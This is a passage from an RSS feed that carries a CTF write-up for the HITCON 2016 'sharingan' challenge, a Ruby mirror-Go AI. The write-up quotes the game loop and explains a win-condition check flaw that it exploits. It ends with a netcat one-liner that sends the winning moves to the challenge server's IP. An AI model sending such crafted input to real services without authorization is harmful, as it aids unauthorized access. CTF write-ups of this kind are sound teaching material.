+&lt;a href=&#34;https://s3-ap-northeast-1.amazonaws.com/hitcon2016qual/sharingan.rb_20a3d2497ad0292d72b4796754c5585523b3e985&#34;&gt;sharingan.rb&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Hint&lt;br /&gt;
+None&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h1 id=&#34;solution&#34;&gt;Solution&lt;/h1&gt;
+
+&lt;p&gt;I started by playing around with the program locally.  It turns out to be a Go AI with very interesting rule: As soon
+as the white stone (me) tries to capture black stone (AI), so called &amp;ldquo;Isanagi&amp;rdquo; is activated.  As a result of &amp;ldquo;Isanagi&amp;rdquo;,
+that last capturing white stone turns black!  Other than this unfair rule, it is a very basic AI that plays pure
+&lt;a href=&#34;https://en.wikipedia.org/wiki/Mirror_go&#34;&gt;Mirror Go&lt;/a&gt;.  If there&amp;rsquo;s no way to mirror the last move, it randomly pick a
+valid move.&lt;/p&gt;
+
+&lt;p&gt;At first I tried to apply some well known mirror go refutations but because of the Isanagi rule, they don&amp;rsquo;t seem to work.
+It looks like there&amp;rsquo;s no easy way to beat this simple AI unless there&amp;rsquo;s fundamental flaw in the program.&lt;/p&gt;
+
+&lt;p&gt;And there is.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;def main
+  brd = Array.new(N){Array.new(N){EMPTY}}
+  who = 0
+  loop do
+    color = color_of who
+    case who
+    when 0 then x, y = ai(brd, color)
+    when 1 then x, y = player(brd, color)
+    else 
+    end
+    next if x.nil?
+    brd[x][y] = color
+    if who == 1 and will_capture(brd, x, y, color)
+      puts &amp;quot;Isanagi activated!&amp;quot;
+      brd[x][y] = exchg(brd[x][y])
+    end
+    N.times do |a|
+      N.times do |b|
+        next if brd[a][b] == EMPTY || brd[a][b] == color
+        capture!(brd, a, b) if not alive?(brd, a, b, Set.new)
+      end
+    end
+    @last_x, @last_y = x, y
+    who ^= 1
+    show(brd) and flag if win(brd) # &amp;lt;&amp;lt;&amp;lt; checks at every iteration
+  end
+end
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It turns out the program checks the winning condition &lt;em&gt;at every iteration&lt;/em&gt;.  It checks if there&amp;rsquo;re more white stones
+than black stones right after the white stone&amp;rsquo;s move, before the mirror happens.  This means if I can capture and remove
+two (because black takes first move) black stones in one move, it will show me the flag!&lt;/p&gt;
+
+&lt;p&gt;That&amp;rsquo;s easy enough.  Since AI simply mirror my move, I can pre-capture an area with three holes, put two black stones
+into them, and fill the last hole with white stone.  The Isanagi rule will turn the last white stone into black.  Because
+it is pre-captured, all three black stones will be removed.  In the last move, one white stone and two black stones were
+removed, temporarily leaving more white stones than black stones, and prints the flag.&lt;/p&gt;
+
+&lt;p&gt;So the final solution:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ print &amp;quot;0 1\n1 1\n2 1\n3 1\n3 0\n18 18\n17 18\n2 0&amp;quot; | nc 52.197.160.186 31337
+&lt;/code&gt;&lt;/pre&gt;</description>
+    </item>
+    
+  </channel>
+</rss>
